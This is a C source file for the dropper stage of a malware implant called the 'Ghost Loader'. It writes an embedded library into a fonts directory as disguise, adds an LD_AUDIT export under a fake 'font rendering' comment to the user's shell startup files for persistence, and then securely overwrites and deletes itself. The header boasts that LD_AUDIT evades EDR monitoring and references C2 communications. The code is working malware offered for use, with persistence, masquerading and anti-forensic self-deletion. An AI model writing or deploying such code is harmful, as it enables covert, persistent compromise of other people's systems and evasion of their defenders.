/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Environment Catalyst
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : catalyst/catalyst.c
 *  Purpose        : Phase 1 of the Ghost Loader — Implantation Mechanism.
 *                   Drops the nexus_auditor.so to a discreet path, sets the
 *                   LD_AUDIT environment variable by modifying shell RC files,
 *                   and then self-destructs.
 *
 *  LD_AUDIT vs LD_PRELOAD:
 *  LD_AUDIT is the GNU dynamic linker's auditing interface (rtld-audit(7)).
 *  Unlike LD_PRELOAD (which simply loads a library early), LD_AUDIT gives
 *  code direct access to the linker's internal resolution machinery via
 *  callbacks: la_version, la_objopen, la_symbind64, la_activity, etc.
 *  It can inspect every shared object load, intercept every symbol binding,
 *  and redirect PLT entries at link time.  Critically, it is almost never
 *  monitored by EDR/HIDS solutions — they all watch LD_PRELOAD.
 *
 *  Lifecycle:
 *    1. Extract embedded nexus_auditor.so payload
 *    2. Write it to ~/.local/share/fonts/nexus_auditor.so
 *    3. Modify ~/.bashrc, ~/.zshrc, ~/.profile to export LD_AUDIT
 *    4. Self-destruct (overwrite + unlink)
 * ============================================================================
 */

#include "../c2_comms/crypto.h"
#include "../common/config.h"
#include "../common/logging.h"
#include "../common/types.h"


#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>


/* ── Embedded Payload (placeholder) ──────────────────────────────────────── */

/*
 * In production, this is the compiled nexus_auditor.so, XOR-encrypted
 * and embedded as a byte array.  The gen_engine populates this at build time.
 *
 * For the template, we use a placeholder that the build system replaces.
 */
extern const uint8_t _binary_build_nexus_auditor_so_start[];
extern const uint8_t _binary_build_nexus_auditor_so_end[];
extern const size_t _binary_build_nexus_auditor_so_size;

/* ── Internal: Create directory path recursively ─────────────────────────── */

static int mkdirp(const char *path, mode_t mode) {
  char tmp[512];
  strncpy(tmp, path, sizeof(tmp) - 1);
  tmp[sizeof(tmp) - 1] = '\0';

  for (char *p = tmp + 1; *p; p++) {
    if (*p == '/') {
      *p = '\0';
      mkdir(tmp, mode);
      *p = '/';
    }
  }
  return mkdir(tmp, mode);
}

/* ── Internal: Drop the auditor .so ──────────────────────────────────────── */

static aegis_result_t drop_auditor(const char *home, aegis_log_ctx_t *log) {
  char auditor_dir[512];
  snprintf(auditor_dir, sizeof(auditor_dir), "%s/%s", home,
           AEGIS_AUDITOR_REL_PATH);

  /* Create the directory structure (looks like a fonts directory) */
  mkdirp(auditor_dir, 0755);

  char auditor_path[512];
  snprintf(auditor_path, sizeof(auditor_path), "%.490s%s", auditor_dir,
           AEGIS_AUDITOR_FILENAME);

  /* Check if already deployed */
  if (access(auditor_path, F_OK) == 0) {
    aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_INFO,
                    "Auditor already deployed at %s", auditor_path);
    return AEGIS_OK; /* Already in place */
  }

  /* Write the auditor .so */
  int fd = open(auditor_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (fd < 0) {
    aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_ERROR,
                    "Failed to create auditor: %s (errno=%d)", auditor_path,
                    errno);
    return AEGIS_ERR_SYSCALL;
  }

  /*
   * In production: decrypt the embedded payload before writing.
   * Template: use the linker-embedded binary blob.
   */
  const uint8_t *payload = _binary_build_nexus_auditor_so_start;
  size_t payload_len =
      (size_t)(_binary_build_nexus_auditor_so_end - _binary_build_nexus_auditor_so_start);

  size_t written = 0;
  while (written < payload_len) {
    ssize_t n = write(fd, payload + written, payload_len - written);
    if (n < 0) {
      close(fd);
      unlink(auditor_path);
      return AEGIS_ERR_SYSCALL;
    }
    written += (size_t)n;
  }

  close(fd);

  aegis_log_transform(log, LOG_CAT_CATALYST, "auditor_deployed", auditor_path,
                      NULL, NULL, payload_len,
                      "nexus_auditor.so written to fonts directory "
                      "(%zu bytes)",
                      payload_len);

  return AEGIS_OK;
}

/* ── Internal: Inject LD_AUDIT into shell RC files ───────────────────────── */

static aegis_result_t inject_ld_audit(const char *home, aegis_log_ctx_t *log) {
  char auditor_path[512];
  snprintf(auditor_path, sizeof(auditor_path), "%s/%s%s", home,
           AEGIS_AUDITOR_REL_PATH, AEGIS_AUDITOR_FILENAME);

  /*
   * The export line we inject.  It looks innocuous alongside
   * legitimate environment setup in RC files.
   */
  char export_line[1024];
  snprintf(export_line, sizeof(export_line),
           "\n# Font rendering library audit\n"
           "export %s=%s\n",
           AEGIS_AUDIT_ENV_VAR, auditor_path);

  /* List of shell RC files to modify */
  const char *rc_files_csv = AEGIS_SHELL_RC_FILES;
  char rc_list[256];
  strncpy(rc_list, rc_files_csv, sizeof(rc_list) - 1);

  char *saveptr;
  char *rc_name = strtok_r(rc_list, ",", &saveptr);
  int injected = 0;

  while (rc_name) {
    char rc_path[512];
    snprintf(rc_path, sizeof(rc_path), "%s/%s", home, rc_name);

    /* Check if already injected */
    bool already_present = false;
    FILE *f = fopen(rc_path, "r");
    if (f) {
      char line[1024];
      while (fgets(line, sizeof(line), f)) {
        if (strstr(line, AEGIS_AUDIT_ENV_VAR) &&
            strstr(line, AEGIS_AUDITOR_FILENAME)) {
          already_present = true;
          break;
        }
      }
      fclose(f);
    }

    if (!already_present) {
      /* Append our export line */
      f = fopen(rc_path, "a");
      if (f) {
        fputs(export_line, f);
        fclose(f);
        injected++;

        aegis_log_transform(log, LOG_CAT_CATALYST, "rc_injection", rc_path,
                            NULL, NULL, strlen(export_line),
                            "LD_AUDIT export injected into %s", rc_name);
      }
    }

    rc_name = strtok_r(NULL, ",", &saveptr);
  }

  /* Also set LD_AUDIT in /proc/self/environ for current session */
  setenv(AEGIS_AUDIT_ENV_VAR, auditor_path, 1);

  aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_INFO,
                  "LD_AUDIT injection complete (%d RC files modified)",
                  injected);

  return AEGIS_OK;
}

/* ── Internal: Self-destruct ─────────────────────────────────────────────── */

static void catalyst_self_destruct(aegis_log_ctx_t *log) {
  char self_path[512];
  ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
  if (len < 0)
    return;
  self_path[len] = '\0';

  struct stat st;
  if (stat(self_path, &st) != 0)
    return;

  /* Multi-pass overwrite */
  int fd = open(self_path, O_WRONLY);
  if (fd >= 0) {
    uint8_t *buf = malloc(st.st_size);
    if (buf) {
      for (int pass = 0; pass < 3; pass++) {
        aegis_random_bytes(buf, st.st_size);
        lseek(fd, 0, SEEK_SET);
        if (write(fd, buf, st.st_size) != (ssize_t)st.st_size) {
          /* Ignore write error */
        }
        fsync(fd);
      }
      memset(buf, 0, st.st_size);
      lseek(fd, 0, SEEK_SET);
      if (write(fd, buf, st.st_size) != (ssize_t)st.st_size) {
        /* Ignore write error */
      }
      fsync(fd);
      free(buf);
    }
    close(fd);
  }

  unlink(self_path);

  aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_INFO,
                  "Catalyst self-destructed: %s", self_path);
}

/* ── Main Entry Point ────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
  (void)argc;
  (void)argv;

  const char *home = getenv("HOME");
  if (!home)
    return 0;

  /* Initialize logging */
  char log_path[512];
  snprintf(log_path, sizeof(log_path), "%s/%s", home, AEGIS_LOG_REL_PATH);
  aegis_log_ctx_t *log = aegis_log_init(log_path, 0);

  aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_INFO,
                  "=== Aegis Catalyst initiated ===");

  /*
   * ═══ STEP 1: DROP NEXUS AUDITOR ═══
   */
  aegis_result_t rc = drop_auditor(home, log);
  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_CRITICAL,
                    "Failed to deploy auditor (rc=%d)", rc);
    aegis_log_finalize(log);
    return 0;
  }

  /*
   * ═══ STEP 2: INJECT LD_AUDIT ═══
   */
  rc = inject_ld_audit(home, log);
  if (rc != AEGIS_OK) {
    aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_CRITICAL,
                    "Failed to inject LD_AUDIT (rc=%d)", rc);
    aegis_log_finalize(log);
    return 0;
  }

  /*
   * ═══ STEP 3: SELF-DESTRUCT ═══
   */
  aegis_log_event(log, LOG_CAT_CATALYST, LOG_SEV_INFO,
                  "=== Catalyst mission complete, initiating "
                  "self-destruct ===");
  aegis_log_finalize(log);

  catalyst_self_destruct(NULL);

  return 0;
}
